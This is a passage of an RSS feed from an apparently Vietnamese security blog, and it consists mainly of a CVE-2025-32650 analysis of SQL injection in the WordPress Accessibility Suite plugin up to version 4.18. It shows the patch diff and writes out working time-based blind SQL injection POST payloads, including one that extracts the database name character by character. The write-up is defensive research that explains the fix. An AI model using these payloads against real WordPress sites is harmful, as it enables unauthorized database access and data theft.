1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection Cheat Sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mystyle-custom-product-designer/vulnerability/wordpress-mystyle-custom-product-designer-3-21-1-sql-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MyStyle Custom Product Designer Plugin &amp;lt;= 3.21.1 SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32650 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-26-cve-2025-32650/</link>
      <pubDate>Fri, 26 Sep 2025 10:36:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-26-cve-2025-32650/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-26-cve-2025-32650/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng xảy ra trên plugin &lt;strong&gt;Accessibility Suite&lt;/strong&gt; của WordPress trước phiên bản &lt;strong&gt;4.19&lt;/strong&gt;. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32650&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32650&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/online-accessibility/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Suite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.18&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Accessibility Suite&lt;/strong&gt;:  v4.18(vul) và v4.19(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Ứng dụng chưa thực hiện ép kiểu cho &lt;strong&gt;input&lt;/strong&gt; và mặc dù có sử dụng &lt;code&gt;prepare()&lt;/code&gt; để chống SQLi, nhưng do triển khai không đúng nên lỗ hổng SQLi vẫn tồn tại.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.&#xA;Có sự khác biệt rõ ở file &lt;strong&gt;includes/classes/Helper.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static function save_false_positive($scan_id, $issue_id){&#xA;    // other logic&#xA;    if(! is_admin()) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;    // other logic&#xA;    $list = json_decode(&#xA;        $wpdb-&amp;gt;get_results($wpdb-&amp;gt;prepare(&amp;#34;SELECT list FROM  $table_name WHERE scan_id = $scan_id&amp;#34;))[0]-&amp;gt;list // phpcs:ignore&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã truyền &lt;code&gt;$scan_id&lt;/code&gt; như tham số vào câu query. SQL injection được phòng ngừa vì biến không được nối trực tiếp vào query nữa.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static function save_false_positive($scan_id, $issue_id){&#xA;    // other logic&#xA;    if(! is_admin()) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;    // other logic&#xA;    $scan_id = absint($scan_id); // Ensure scan_id is a positive integer&#xA;    &#xA;    if (!$scan_id) {&#xA;        return [&amp;#34;status&amp;#34; =&amp;gt; &amp;#34;failed&amp;#34;, &amp;#34;msg&amp;#34; =&amp;gt; &amp;#34;Invalid scan ID&amp;#34;];&#xA;    }&#xA;    &#xA;    // Get list using properly prepared query&#xA;    $query = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT list FROM %i WHERE scan_id = %d&amp;#34;,&#xA;        $table_name,&#xA;        $scan_id&#xA;    );&#xA;    &#xA;    $result = $wpdb-&amp;gt;get_results($query);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-26-cve-2025-32650/patch_diff.png&#34;&#xA;    alt=&#34;patch diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Lỗ hổng nằm trong hàm tĩnh &lt;code&gt;save_false_positive&lt;/code&gt; của class &lt;code&gt;Helper&lt;/code&gt; thuộc file &lt;strong&gt;includes/classes/Helper.php&lt;/strong&gt;. Để xác định nơi nó được gọi, ta tìm kiếm với tự khóa &lt;code&gt;save_false_positive&lt;/code&gt; trong thư mục chứa plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-26-cve-2025-32650/search_1.png&#34;&#xA;    alt=&#34;search save_false_positive&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search save_false_positive&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 &lt;code&gt;save_false_positive&lt;/code&gt; được &lt;code&gt;callback&lt;/code&gt; của action hook &lt;code&gt;wp_ajax_ONLINE_ADAv4/save_false_positive&lt;/code&gt; gọi.&lt;/p&gt;&#xA;&lt;p&gt;Khi &lt;strong&gt;POST&lt;/strong&gt; request được gửi đến &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với &lt;code&gt;action&lt;/code&gt;=&lt;code&gt;ONLINE_ADAv4/save_false_positive&lt;/code&gt; callback được gọi.&#xA;Trong request cần 2 &lt;strong&gt;POST&lt;/strong&gt; param &lt;code&gt;issue_id&lt;/code&gt; và &lt;code&gt;scan_id&lt;/code&gt;. Nếu không, ứng dụng sẽ trả về:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;status&amp;#34;:&amp;#34;failed&amp;#34;,&amp;#34;msg&amp;#34;:&amp;#34;Did not receive the scan ID or the issue ID&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;save_false_positive&lt;/code&gt; được gọi với đối số &lt;code&gt;issue_id&lt;/code&gt; và &lt;code&gt;scan_id&lt;/code&gt;. Các đối số này sẽ bị escape bởi &lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;magic quotes&lt;/strong&gt;&lt;/a&gt; trong WordPress vì lấy trực tiếp từ &lt;strong&gt;POST&lt;/strong&gt; request.&lt;/p&gt;&#xA;&lt;p&gt;Ứng dụng check xem người dùng có quyền truy cập vào trang admin không. Nếu không, trả về chuỗi rỗng.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(! is_admin()) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau đó các đối số trực tiếp truyền vào câu query chứa lỗ hổng SQLi rồi thực thi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi &lt;strong&gt;POST request&lt;/strong&gt; chứa payload SQLi. Vì chỉ cần là user có quyền truy cập vào trang admin, nên ta tạo user với &lt;code&gt;role:subcriber&lt;/code&gt; có &lt;strong&gt;privilege thấp nhất&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Trong WordPress, user có role cao hơn sẽ kế thừa cả &lt;strong&gt;privilege&lt;/strong&gt; role thấp hơn. Nên chỉ cần user &lt;code&gt;subcriber&lt;/code&gt; gửi payload thành công thì tất cả user còn lại đều có thể. Đúng với mô tả của CVE&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=ONLINE_ADAv4/save_false_positive&amp;amp;issue_id=1&amp;amp;scan_id=1 UNION SELECT SLEEP(5)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi đó câu query sẽ trở thành&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT list FROM  wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5)&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-26-cve-2025-32650/time_response.png&#34;&#xA;    alt=&#34;time response with SQLi payload&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Time response with SQLi payload&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Dựa trên thời gian phản hồi =&amp;gt; payload hoạt động.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Các technique có thể sử dụng trong trường hợp table rỗng&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;UNION&lt;/strong&gt;: vì nó không phụ thuộc vào dữ liệu bảng của câu query trước đó, nhưng cần phải tìm được số cột tương ứng với truy vấn trước đó.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Subquery&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Subquery trong mệnh đề WHERE&lt;/strong&gt;: MySQL có thể tối ưu hóa và bỏ qua subquery nếu kết quả có thể xác định sớm. Nếu bảng không có dữ liệu, kết quả cuối cùng sẽ là tập rỗng, MySQL không cần thực thi &lt;code&gt;SLEEP()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Subquery trong mệnh đề FROM&lt;/strong&gt;: Truy vấn con được coi là bảng tạm thời. MySQL phải thực thi truy vấn con này đầu tiên để tạo bảng tạm thời, sau đó mới thực thi truy vấn chính.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png&#34;&#xA;    alt=&#34;SQL Execution Order Diagram&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;SQL Execution Order Diagram&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Điều kiện tiên quyết để &lt;strong&gt;dump được hết data&lt;/strong&gt; là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được.&lt;/p&gt;&#xA;&lt;p&gt;Gửi request với &lt;strong&gt;SQLi payload&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=ONLINE_ADAv4/save_false_positive&amp;amp;issue_id=1&amp;amp;scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sử dụng &lt;code&gt;SUBSTRING()&lt;/code&gt; để lấy ký tự đầu tiên của &lt;strong&gt;database name&lt;/strong&gt;, &lt;code&gt;IF()&lt;/code&gt; trả về &lt;code&gt;SLEEP(5)&lt;/code&gt; nếu ký tự đó là &lt;code&gt;0x77&lt;/code&gt;(&amp;lsquo;w&amp;rsquo;)&lt;/p&gt;&#xA;&lt;p&gt;Sử dụng hex encoding &lt;code&gt;w&lt;/code&gt; thành &lt;code&gt;0x77&lt;/code&gt; vì như phân tích &lt;a href=&#34;#how-it-work&#34;&gt;ở trên&lt;/a&gt;, &lt;code&gt;scan_id&lt;/code&gt; sẽ bị escape.&lt;/p&gt;&#xA;&lt;p&gt;👉 Dựa trên thời gian phản hồi =&amp;gt; kí tự đầu tiên đúng là &lt;code&gt;w&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-32650&lt;/strong&gt; trong plugin WordPress &lt;strong&gt;Accessibility Suite&lt;/strong&gt; trước phiên bản &lt;strong&gt;4.19&lt;/strong&gt; xuất phát từ việc triển khai không đúng hàm &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; dẫn đến lỗ hổng SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá chính thức đã triển khai đúng &lt;code&gt;$wpdb-&amp;gt;prepare&lt;/code&gt;, giúp đảm bảo dữ liệu đầu vào được kiểm soát và an toàn hơn.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Luôn sử dụng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; khi làm việc với database trong WordPress để tránh SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://wordpress.org/plugins/online-accessibility/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Accessibility Suite Plugin &amp;lt;= 4.18 is vulnerable to SQL Injection &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-58604 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-25-cve-2025-58604/</link>
      <pubDate>Thu, 25 Sep 2025 21:13:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-25-cve-2025-58604/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
